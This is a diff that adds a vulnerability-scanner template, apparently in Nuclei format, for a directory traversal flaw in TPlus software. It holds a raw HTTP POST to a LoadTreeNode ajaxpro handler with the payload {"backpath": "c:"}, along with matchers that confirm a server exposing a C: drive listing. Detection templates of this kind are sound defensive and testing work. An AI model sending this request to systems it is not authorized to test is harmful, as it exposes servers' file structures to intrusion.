@@ -1,0 +1,27 @@
+id: TPlus-LoadTreeNode-DirectoryTraversal
+
+info:
+  name: TPlus-LoadTreeNode-DirectoryTraversal
+  author: iSee857
+  severity: high
+  description: |
+    TPlus-LoadTreeNode-DirectoryTraversal
+  tags: lfi,tplus
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/ASP.sm_setupaccount_versionupdate_selectbackupfileonserver_aspx,App_Web_selectbackupfileonserver.aspx.1cbd2a00.ashx?method=LoadTreeNode HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"backpath": "c:"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'Value":"c:\\'
+        condition: and
+
+      - type: status
+        status:
+          - 200
